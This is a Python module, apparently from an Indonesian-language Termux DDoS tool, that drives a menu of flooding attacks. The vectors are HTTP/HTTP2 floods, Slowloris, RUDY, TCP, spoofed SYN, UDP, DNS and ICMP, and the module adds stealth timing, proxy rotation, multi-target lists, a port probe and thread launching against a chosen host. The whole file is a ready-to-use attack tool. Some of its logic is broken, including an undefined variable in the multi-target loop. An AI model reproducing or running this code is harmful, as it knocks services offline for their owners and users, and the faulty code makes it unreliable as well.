# language: Python 3, file: core/engine.py
# orkestrasi: session, menu, sub-menu, fire
import os, threading, time
from . import config, ui, net, stats as stats_mod, workers
from .ui import C

VECTORS = [
    ("1", "http",  "HTTP/1.1 Flood",     "GET/POST/HEAD, header jitter, keep-alive"),
    ("2", "h2",    "HTTP/2 Multiplex",   "ALPN h2, puluhan stream paralel"),
    ("3", "slow",  "Slowloris",          "header paruh, koneksi tertahan"),
    ("4", "ruddy", "R-U-Dead-Yet",       "slow POST body, connection exhaustion"),
    ("5", "tcp",   "TCP Connect Flood",  "3-way handshake terus-menerus"),
    ("6", "syn",   "SYN Raw Flood",      "butuh root, IP spoofed"),
    ("7", "udp",   "UDP Flood",          "payload acak / json / form"),
    ("8", "dns",   "DNS Query Flood",    "label acak, A / ANY"),
    ("9", "icmp",  "ICMP Echo Flood",    "butuh root, echo request banjir"),
    ("0", "mixed", "Mixed Multi-Vector", "acak semua vektor non-root"),
]
VECTOR_MAP = {k: m for k, m, _, _ in VECTORS}
VECTOR_LABEL = {m: label for _, m, label, _ in VECTORS}

PROFILES = {
    "light":  {"threads": 50,  "duration": 60,  "stealth": False},
    "medium": {"threads": 200, "duration": 120, "stealth": False},
    "heavy":  {"threads": 500, "duration": 300, "stealth": False},
    "stealth":{"threads": 30,  "duration": 180, "stealth": True},
}


class Session:
    def __init__(self):
        self.cfg = config.load_cfg()
        self.stats = stats_mod.Stats()
        self.stop = threading.Event()
        self.ips = []

    def save(self):
        config.save_cfg(self.cfg)

    def resolve(self):
        self.ips = net.resolve(self.cfg["host"])
        return self.ips


# ─── banner + main menu ───────────────────────────────
def menu_utama(sess):
    ui.banner(f"v7 · termux · {sess.cfg['profile']} · {len(sess.cfg.get('proxy_file','')) and 'proxy' or 'direct'}")
    print()
    if sess.cfg["host"]:
        print(f"  {C.D}target aktif: {C.R}{C.G}{sess.cfg['host']}{C.R}"
              f"{C.D}:{sess.cfg['port']}  metode {sess.cfg['method']}  "
              f"thread {sess.cfg['threads']}  durasi {sess.cfg['duration']}s{C.R}\n")
    else:
        print(f"  {C.D}belum ada target — pilih vektor untuk isi URL pertama kali{C.R}\n")

    print(f"  {C.Cy}╭─ VEKTOR SERANGAN ───────────────────────────────╮{C.R}")
    for k, m, label, desc in VECTORS:
        print(f"  {C.Cy}│{C.R} {C.G}[{k}]{C.R} {label:<22}{C.D}{desc}{C.R}")
    print(f"  {C.Cy}╰─────────────────────────────────────────────────╯{C.R}")
    print()
    print(f"  {C.Cy}╭─ LAINNYA ────────────────────────────────────────╮{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[s]{C.R} Settings      {C.D}threads/durasi/stealth/payload{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[p]{C.R} Profiles      {C.D}simpan / muat profil{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[x]{C.R} Proxies       {C.D}muat file proxy{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[u]{C.R} User-Agents   {C.D}muat file UA{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[T]{C.R} Target list   {C.D}multi-target dari file{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[r]{C.R} Recon         {C.D}resolve + port probe{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[i]{C.R} Info          {C.D}config aktif{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Rd}[q]{C.R} Keluar{C.R}")
    print(f"  {C.Cy}╰─────────────────────────────────────────────────╯{C.R}")
    print()


# ─── sub-menu vektor ──────────────────────────────────
def sub_menu_vektor(sess, kode):
    metode = VECTOR_MAP[kode]
    label = VECTOR_LABEL[metode]
    cfg = sess.cfg

    ui.banner(f"vektor · {label}")
    print()
    ui.info("vektor", metode)
    ui.hr()

    # URL
    if cfg["host"]:
        url = ui.prompt("URL / host target (kosong = pakai tersimpan)", cfg["host"])
    else:
        url = ui.prompt("URL / host target", "")

    if not url:
        ui.fail("target kosong"); ui.wait(); return

    h, port, tls, path = net.parse_url(url)
    if metode == "dns":
        port = 53
    if metode == "h2" and port == 80:
        port = 443; tls = True
    cfg["host"] = h
    cfg["port"] = port
    cfg["tls"] = tls
    cfg["path"] = path

    cfg["threads"] = ui.prompt_int("threads", cfg["threads"])
    cfg["duration"] = ui.prompt_int("durasi detik (0=∞)", cfg["duration"])

    if metode in ("http", "h2", "slow", "ruddy"):
        cfg["keepalive"] = ui.prompt_bool("keep-alive", cfg["keepalive"])
    if metode in ("http", "udp"):
        cfg["payload_mode"] = ui.prompt("payload mode (rand/json/form)", cfg["payload_mode"])
    if metode == "udp":
        cfg["size"] = ui.prompt_int("ukuran payload byte", cfg["size"])

    sess.save()

    # konfirmasi
    ui.cls()
    ui.banner(f"konfirmasi · {label}")
    print()
    ui.info("vektor", metode)
    ui.info("target", f"{cfg['host']}:{cfg['port']}")
    ui.info("tls", cfg["tls"])
    ui.info("path", cfg["path"])
    ui.info("threads", cfg["threads"])
    ui.info("durasi", f"{cfg['duration']}s{' (∞)' if cfg['duration'] == 0 else ''}")
    if metode in ("http", "h2", "slow", "ruddy"):
        ui.info("keepalive", cfg["keepalive"])
    ui.info("payload", cfg.get("payload_mode", "rand"))
    ui.info("stealth", cfg.get("stealth", False))
    ui.info("proxy", f"{len(net.load_proxies(cfg.get('proxy_file', '')))} entri")
    print()
    print(f"  {C.G}[1]{C.R} Lanjut — mulai serang")
    print(f"  {C.Rd}[2]{C.R} Batal  — kembali ke menu")
    print()

    p = input(f"{C.G}  pilih> {C.R}").strip().lower()
    if p in ("1", "l", "lanjut", "y", "ya", "yes"):
        fire(sess, metode)
    elif p in ("2", "b", "batal", "n", "no"):
        return
    else:
        ui.warn("batal (input tidak dikenal)")
        time.sleep(0.8)


# ─── fire ─────────────────────────────────────────────
def fire(sess, metode):
    cfg = sess.cfg
    if not sess.resolve():
        ui.fail(f"gagal resolve {cfg['host']} — cek jaringan")
        ui.wait(); return

    # multi-target: kalau targets_file diisi, round-robin ke IP semua target
    extra_ips = []
    for t in net.load_lines(cfg.get("targets_file", "")):
        h2, p2, _, _ = net.parse_url(t)
        if h != cfg["host"] if False else True:
            r = net.resolve(h2)
            extra_ips.extend(r)
    all_ips = list(set(sess.ips + extra_ips))

    ctx = workers.Ctx(cfg, all_ips, sess.stats, sess.stop)
    sess.stop.clear()
    sess.stats.reset()

    ui.cls()
    print(C.Cy + C.B + f"\n  ▶ FLOOD AKTIF — {metode.upper()}\n" + C.R)
    ui.info("target", f"{cfg['host']}:{cfg['port']}")
    ui.info("threads", cfg["threads"])
    ui.info("durasi", f"{cfg['duration']}s")
    ui.info("ip", ", ".join(all_ips[:4]) + (" …" if len(all_ips) > 4 else ""))
    ui.info("proxy", len(ctx.proxies))
    ui.info("stealth", cfg.get("stealth", False))
    ui.hr()
    print()

    sess.stats.start_print(C.Cy, C.R)
    t0 = time.time()
    for _ in range(cfg["threads"]):
        workers.get_worker(metode, ctx).start()

    try:
        if cfg["duration"] > 0:
            time.sleep(cfg["duration"])
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print()

    sess.stop.set()
    sess.stats.stop_print()
    time.sleep(0.8)

    snap = sess.stats.snapshot()
    elapsed = time.time() - t0
    print(f"\n  {C.G}■  selesai.{C.R}  paket {snap['pkts']}  byte {snap['bytes']}  "
          f"ok {snap['ok']}  gagal {snap['fail']}  durasi {elapsed:.0f}s")
    if snap["errors"]:
        for e in snap["errors"][-3:]:
            print(f"  {C.Rd}· {e}{C.R}")

    # log ke file
    log_path = os.path.join(config.LOG_DIR, time.strftime("%Y-%m-%d.log"))
    try:
        with open(log_path, "a") as f:
            f.write(f"{time.strftime('%H:%M:%S')} | {metode:<6} | {cfg['host']}:{cfg['port']} "
                    f"| threads={cfg['threads']} dur={elapsed:.0f}s "
                    f"| pkt={snap['pkts']} ok={snap['ok']} fail={snap['fail']}\n")
    except Exception:
        pass

    ui.wait("enter untuk kembali ke menu…")


# ─── settings / profil / proxy / ua / targets ─────────
def menu_settings(sess):
    cfg = sess.cfg
    while True:
        ui.banner("settings")
        print()
        ui.info("threads", cfg["threads"])
        ui.info("duration", cfg["duration"])
        ui.info("payload_mode", cfg.get("payload_mode", "rand"))
        ui.info("size", cfg.get("size", 1024))
        ui.info("stealth", cfg.get("stealth", False))
        ui.info("stealth_ms", f"{cfg.get('stealth_min_ms', 30)}-{cfg.get('stealth_max_ms', 300)}")
        ui.info("profile", cfg["profile"])
        ui.hr()
        print(f"  {C.G}[1]{C.R} threads    {C.G}[2]{C.R} duration   {C.G}[3]{C.R} payload_mode")
        print(f"  {C.G}[4]{C.R} size       {C.G}[5]{C.R} stealth    {C.G}[6]{C.R} stealth_ms")
        print(f"  {C.Rd}[0]{C.R} kembali")
        print()
        p = input(f"{C.G}  pilih> {C.R}").strip()
        if p == "0" or not p: return
        if p == "1": cfg["threads"] = ui.prompt_int("threads", cfg["threads"])
        elif p == "2": cfg["duration"] = ui.prompt_int("duration detik", cfg["duration"])
        elif p == "3": cfg["payload_mode"] = ui.prompt("payload mode", cfg.get("payload_mode", "rand"))
        elif p == "4": cfg["size"] = ui.prompt_int("size byte", cfg.get("size", 1024))
        elif p == "5": cfg["stealth"] = ui.prompt_bool("stealth", cfg.get("stealth", False))
        elif p == "6":
            cfg["stealth_min_ms"] = ui.prompt_int("stealth min ms", cfg.get("stealth_min_ms", 30))
            cfg["stealth_max_ms"] = ui.prompt_int("stealth max ms", cfg.get("stealth_max_ms", 300))
        sess.save()


def menu_profiles(sess):
    cfg = sess.cfg
    while True:
        ui.banner("profiles")
        print()
        print(f"  aktif: {C.G}{cfg['profile']}{C.R}\n")
        profiles = config.list_profiles()
        for i, name in enumerate(profiles, 1):
            marker = f"{C.G}●{C.R}" if name == cfg["profile"] else " "
            print(f"  {marker} [{i}] {name}")
        print()
        print(f"  {C.G}[n]{C.R} profil baru    {C.G}[d]{C.R} hapus    {C.Rd}[0]{C.R} kembali")
        print()
        p = input(f"{C.G}  pilih> {C.R}").strip().lower()
        if p == "0" or not p: return
        if p == "n":
            name = ui.prompt("nama profil baru", "custom")
            if name:
                cfg["profile"] = name
                sess.save()
                ui.ok(f"profil {name} dibuat")
        elif p == "d":
            name = ui.prompt("nama profil yang dihapus", "")
            if name and name != "default":
                sess.save()  # flush current first
                # hapus via rewrite
                import json
                try:
                    with open(config.CONFIG_FILE) as f:
                        data = json.load(f)
                    data["profiles"].pop(name, None)
                    with open(config.CONFIG_FILE, "w") as f:
                        json.dump(data, f, indent=2)
                    ui.ok(f"profil {name} dihapus")
                except Exception as e:
                    ui.fail(str(e))
        elif p.isdigit():
            idx = int(p) - 1
            if 0 <= idx < len(profiles):
                cfg["profile"] = profiles[idx]
                sess.save()
                sess.cfg = config.load_cfg()
                cfg = sess.cfg
                ui.ok(f"profil {profiles[idx]} dimuat")
        else:
            # preset cepat
            if p in PROFILES:
                for k, v in PROFILES[p].items():
                    cfg[k] = v
                sess.save()
                ui.ok(f"preset {p} diterapkan")
        time.sleep(0.6)


def menu_proxies(sess):
    ui.banner("proxies")
    print()
    ui.info("file aktif", sess.cfg.get("proxy_file") or "-")
    ui.info("jumlah", len(net.load_proxies(sess.cfg.get("proxy_file", ""))))
    print()
    f = ui.prompt("path file proxy (kosong=skip)", sess.cfg.get("proxy_file") or "")
    if f:
        sess.cfg["proxy_file"] = f
        sess.save()
        n = len(net.load_proxies(f))
        ui.ok(f"proxy file = {f} ({n} entri)")
    if ui.prompt_bool("hapus referensi proxy", False):
        sess.cfg["proxy_file"] = ""
        sess.save()
        ui.ok("proxy dikosongkan")
    ui.wait()


def menu_ua(sess):
    ui.banner("user-agents")
    print()
    ui.info("file aktif", sess.cfg.get("ua_file") or "-")
    f = ui.prompt("path file UA (kosong=skip)", sess.cfg.get("ua_file") or "")
    if f:
        sess.cfg["ua_file"] = f
        sess.save()
        ui.ok(f"ua file = {f} ({len(net.load_lines(f))} UA)")
    ui.wait()


def menu_targets(sess):
    ui.banner("multi-target")
    print()
    ui.info("file aktif", sess.cfg.get("targets_file") or "-")
    ui.info("jumlah", len(net.load_lines(sess.cfg.get("targets_file", ""))))
    print()
    f = ui.prompt("path file target (kosong=skip)", sess.cfg.get("targets_file") or "")
    if f:
        sess.cfg["targets_file"] = f
        sess.save()
        n = len(net.load_lines(f))
        ui.ok(f"target file = {f} ({n} entri)")
    ui.wait()


def menu_recon(sess):
    ui.banner("recon")
    print()
    host = ui.prompt("host / URL", sess.cfg["host"]) or sess.cfg["host"]
    if not host:
        ui.fail("kosong"); ui.wait(); return
    h = net.parse_url(host)[0] if ("://" in host or ":" in host) else host
    ips = net.resolve(h)
    if not ips:
        ui.fail(f"gagal resolve {h}"); ui.wait(); return
    print()
    ui.info("host", h)
    ui.info("ip", ", ".join(ips))
    print()
    print(f"  {C.Cy}port probe:{C.R}")
    for pp in [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
               3306, 3389, 5432, 8080, 8443]:
        try:
            s = __import__("socket").socket()
            s.settimeout(0.6)
            s.connect((ips[0], pp))
            print(f"    {C.G}● {pp:<5} open{C.R}")
            s.close()
        except Exception:
            pass
    ui.wait()


def menu_info(sess):
    ui.banner("info")
    print()
    for k, v in sess.cfg.items():
        ui.info(k, v)
    print()
    ui.info("config_file", config.CONFIG_FILE)
    ui.info("log_dir", config.LOG_DIR)
    ui.wait()


# ─── main loop ────────────────────────────────────────
def main():
    sess = Session()
    try:
        while True:
            menu_utama(sess)
            p = input(f"{C.G}  pilih> {C.R}").strip().lower()
            if p in ("q", "quit", "exit", "0"):
                break
            if p in ("s", "settings"):
                menu_settings(sess); continue
            if p in ("p", "profiles"):
                menu_profiles(sess); continue
            if p in ("x", "proxies"):
                menu_proxies(sess); continue
            if p in ("u", "ua"):
                menu_ua(sess); continue
            if p in ("t", "targets"):
                menu_targets(sess); continue
            if p in ("r", "recon"):
                menu_recon(sess); continue
            if p in ("i", "info"):
                menu_info(sess); continue
            if p in VECTOR_MAP:
                sub_menu_vektor(sess, p); continue
            if not p:
                continue
            ui.fail(f"pilihan tidak dikenal: {p}")
            time.sleep(0.7)
    except KeyboardInterrupt:
        pass
    ui.cls()
    print(C.Cy + "\n  keluar. config di ddos.json, log di logs/.\n" + C.R)